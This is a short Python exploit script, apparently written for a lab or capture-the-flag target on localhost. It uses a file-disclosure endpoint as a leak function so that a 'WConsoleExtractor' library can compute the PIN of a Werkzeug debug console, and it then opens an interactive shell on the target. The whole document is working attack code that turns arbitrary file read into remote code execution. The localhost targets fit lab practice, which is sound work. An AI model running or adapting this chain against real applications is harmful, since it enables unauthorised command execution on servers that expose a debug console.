from wconsole_extractor import WConsoleExtractor, info
import requests
from bs4 import BeautifulSoup

def leak_function(filename) -> str:
    r = requests.get(f"http://localhost:3000/file?search={filename}")
    if "File not found" not in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        value = soup.find('pre')
        return str(value.contents[0]).strip()
    else:
        return ""

extractor = WConsoleExtractor(
    target="http://localhost:5000",
    leak_function=leak_function
)


info(f"PIN CODE: {extractor.pin_code}")
extractor.shell()